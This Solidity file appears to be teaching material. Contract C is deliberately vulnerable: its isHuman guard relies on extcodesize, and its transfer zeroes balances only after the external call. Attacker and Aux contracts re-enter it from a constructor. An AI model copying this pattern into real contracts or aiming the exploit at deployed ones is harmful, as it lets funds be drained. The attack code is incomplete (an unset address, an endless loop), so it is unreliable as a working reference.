pragma solidity ^0.8.0;

// SPDX-License-Identifier: GPL-3.0
contract C {
    mapping (address => uint256) private balances;


    // this implementation is unsafe as it allows calls from costructor bodies
    modifier isHuman() {
        address _addr = msg.sender;
        uint256 _codeLength;
        assembly {_codeLength := extcodesize(_addr)}
        require(_codeLength == 0, "sorry humans only");
        _;
    }

    function transfer(address to) isHuman() public {
        uint256 amt = balances[msg.sender];
        require(amt > 0, "Insufficient funds");
        (bool success, ) = to.call{value:amt}("");
        require(success, "Call failed");
        balances[msg.sender] = 0;    // side effect after call
    }

    function deposit() public payable isHuman() {
        balances[msg.sender] += msg.value;       
    }
}

// an attacker performs from off-chain:
//    deposit{value: 100}();
//    transfer(attacker);
contract Attacker {

    bool private reentered = false;
    address c;
  
    receive() payable external {
        if (!reentered) {
            reentered = true;
            new Aux(address(this), c);  // questo accade solo la prima volta
        }
    }
}

contract Aux {
    constructor(address attacker, address c) {
        C(c).deposit{value: 100}();
        while (true) 
            C(c).transfer(attacker);        
    }
}

contract Aux2 {
    constructor(address attacker, address c) {
        C(c).transfer(attacker);        
    }
}